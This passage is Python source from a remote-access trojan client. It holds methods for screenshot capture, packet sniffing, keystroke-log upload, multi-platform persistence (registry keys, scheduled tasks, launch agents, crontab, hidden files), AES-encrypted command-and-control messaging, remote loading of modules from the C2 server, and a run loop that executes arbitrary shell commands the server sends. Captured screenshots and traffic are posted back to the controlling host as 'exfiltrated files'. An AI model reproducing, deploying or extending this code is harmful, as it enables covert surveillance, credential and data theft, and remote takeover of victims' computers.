                return 'Keystroke log upload complete  (see Exfiltrated Files tab to download file)'
            elif 'status' in mode:
                return locals()['status']()
            else:
                return self.keylogger.usage


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='screenshot')
    def screenshot(self, mode=None):
        """
        Capture a screenshot from host device

        `Optional`
        :param str mode:   ftp, imgur (default: None)

        """
        try:
            if 'screenshot' not in globals():
                self.load('screenshot')
            host, port = self.connection.getpeername()
            data = globals()['screenshot'].run()
            json_data = {"data": str(data), "owner": self.owner, "type": "png", "module": self.screenshot.__name__, "session": self.info.get('public_ip')}
            if self.gui:
                globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
            else:
                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
            return 'Screenshot complete  (see Exfiltrated Files tab to download file)'
        except Exception as e:
            result = "{} error: {}".format(self.screenshot.__name__, str(e))
            log(result)
            return result


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
    def persistence(self, args=None):
        """
        Establish persistence on client host machine

        `Required`
        :param str target:          add, remove. methods, results

        `Methods`
        :method all:                All Methods
        :method registry_key:       Windows Registry Key
        :method scheduled_task:     Windows Task Scheduler
        :method startup_file:       Windows Startup File
        :method launch_agent:       Mac OS X Launch Agent
        :method crontab_job:        Linux Crontab Job
        :method hidden_file:        Hidden File

        """
        try:
            if not 'persistence' in globals():
                self.load('persistence')
            cmd, _, action = str(args).partition(' ')
            if cmd not in ('add','remove'):
                return self.persistence.usage
            for method in globals()['persistence']._methods:
                if action == 'all' or action == method:
                    try:
                        getattr(globals()['persistence']._methods[method], cmd)()
                    except Exception as e:
                        log("{} error: {}".format(self.persistence.__name__, str(e)))
            return json.dumps(globals()['persistence'].results())
        except Exception as e:
            log("{} error: {}".format(self.persistence.__name__, str(e)))


    @config(platforms=['linux','linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
    def packetsniffer(self, args):
        """
        Capture traffic on local network

        `Required`
        :param str args:        run, stop, upload

        """
        try:
            if 'packetsniffer' not in globals():
                self.load('packetsniffer')
            args = str(args).split()
            if len(args):
                mode = args[0]
                if 'run' in mode:
                    globals()['packetsniffer'].flag.set()
                    self.handlers['packetsniffer'] = globals()['packetsniffer'].run()
                    return "Network traffic capture started"
                elif 'stop' in mode:
                    globals()['packetsniffer'].flag.clear()
                    return "Network traffic captured stopped"
                elif 'upload' in mode:
                    log = globals()['packetsniffer'].log.getvalue()
                    if len(log):
                        globals()['packetsniffer'].log.reset()
                        host, port = self.connection.getpeername()
                        data = base64.b64encode(log)
                        json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}

                        # upload data to server
                        if self.gui:
                            globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                        else:
                            globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                        return "Network traffic log upload complete (see Exfiltrated Files tab to download file)"
                    else:
                        return "Network traffic log is empty"
                else:
                    return self.packetsniffer.usage
        except Exception as e:
            log("{} error: {}".format(self.packetsniffer.__name__, str(e)))

    def send_task(self, task):
        """
        Send task results to the server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr str session:         session ID assigned by server
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        try:
            if not 'session' in task:
                task['session'] = self.info.get('uid')
            if self.flags.connection.wait(timeout=1.0):
                data = globals()['encrypt_aes'](json.dumps(task), self.key)
                msg  = struct.pack('!L', len(data)) + data
                self.connection.sendall(msg)
                return True
            return False
        except Exception as e:
            e = str(e)
            if "Errno 104" in e or "10054" in e:
                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.send_task.__name__, e))
                self.kill()
                return
            elif "Errno 32" in e or "10052" in e:
                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.send_task.__name__, e))
            elif "Errno 111" in e or "10061" in e:
                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.send_task.__name__, e))
            else:
                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.send_task.__name__, e))
            self.passive()
            #log("{} error: {}".format(self.send_task.__name__, str(e)))


    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str session:         client ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        """
        try:
            hdr_len = struct.calcsize('!L')
            hdr = self.connection.recv(hdr_len)
            if len(hdr) == 4:
                msg_len = struct.unpack('!L', hdr)[0]
                msg = self.connection.recv(msg_len)
                data = globals()['decrypt_aes'](msg, self.key)
                return json.loads(data)
            else:
                log("{} error: invalid header length".format(self.recv_task.__name__))
                log("Restarting client...")
                if not self.connection.recv(hdr_len):
                    self.restart()
        except Exception as e:
            e = str(e)
            if "Errno 104" in e or "10054" in e:
                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.recv_task.__name__, e))
                self.kill()
                return
            elif "Errno 32" in e or "10052" in e:
                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.recv_task.__name__, e))
            elif "Errno 111" in e or "10061" in e:
                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.recv_task.__name__, e))
            else:
                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.recv_task.__name__, e))    
            self.passive()
            #log("{} error: {}".format(self.recv_task.__name__, str(e)))


    def run(self):
        """
        Initialize a reverse TCP shell
        """
        host, port = self.connection.getpeername()

        # run 2 threads which remotely load packages/modules from c2 server
        self.handlers['module_handler'] = self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
        self.handlers['package_handler'] = self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))

        # create thread handlers to cleanup dead/stale threads
        self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
        self.handlers['thread_handler'] = self._get_thread_handler()

        # loop listening for tasks from server and sending responses.
        # if connection is dropped, enter passive mode and retry connection every 30 seconds.
        while True:

            # leave passive mode when connection re-established
            if self.flags.passive.is_set() and not self.flags.connection.is_set():
                host, port = self.c2
                self.connection = self._get_connection(host, port)
                self.key = self._get_key(self.connection)
                self.info = self._get_info()
                log("{} : leaving passive mode.".format(self.run.__name__))
                self.flags.prompt.set()

            # active mode
            elif self.flags.connection.wait(timeout=1.0):
                if self.gui or not self.flags.prompt.is_set():
                    task = self.recv_task()
                    if isinstance(task, dict) and 'task' in task:
                        cmd, _, action = task['task'].partition(' ')
                        try:

                            # run command as module if module exists.
                            # otherwise, run as shell command in subprocess
                            command = self._get_command(cmd)
                            if command:
                                result = command(action) if action else command()
                            else:
                                result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
                                if result == None:
                                    result = reserr

                            # format result
                            if result != None:
                                if type(result) in (list, tuple):
                                    result = '\n'.join(result)
                                elif type(result) == bytes:
                                    result = str(result.decode())
                                else:
                                    result = str(result)
                        except Exception as e:
                            result = "{} error: {}".format(self.run.__name__, str(e)).encode()
                            log(result)


                        # send response to server
                        task.update({'result': result})
                        self.send_task(task)

                    if not self.gui:
                        self.flags.prompt.set()
                elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
                    self.kill()
            else:
                log("Connection timed out")
                break


